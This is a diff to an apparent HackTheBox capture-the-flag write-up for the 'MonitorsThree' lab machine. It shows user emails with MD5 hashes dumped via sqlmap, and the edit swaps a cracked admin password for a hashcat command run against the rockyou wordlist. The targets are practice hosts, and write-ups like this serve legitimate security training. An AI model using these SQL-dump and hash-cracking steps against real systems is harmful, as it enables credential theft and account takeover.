@@ -56,14 +56,14 @@ sqlmap -r post.txt --dump
 dthompson@monitorsthree.htb:633b683cc128fe244b00f176c8a950f5
 janderson@monitorsthree.htb:1e68b6eb86b45f6d92f8f292428f77ac
 mwatson@monitorsthree.htb:c585d01f2eb3e6e1073e92023088a3dd
-admin@monitorsthree.htb:31a181c8372e3afc59dab863430610e8:greencacti2001
+admin@monitorsthree.htb:31a181c8372e3afc59dab863430610e8
 ```
 
-I then attempted to crack the hashes via hashcat, however only one was successful:
-
-![image](https://github.com/user-attachments/assets/cd1525d1-e676-4067-b633-1e9963aba433)
-
-We now have the credentials for admin@monitorsthree.htb.
+We can try cracking the admin@monitorsthree credential:
+```
+hashcat -m 0 -a 0 31a181c8372e3afc59dab863430610e8 /usr/share/wordlists/rockyou.txt
+```
+This will provide a password.
 
 &nbsp;
 
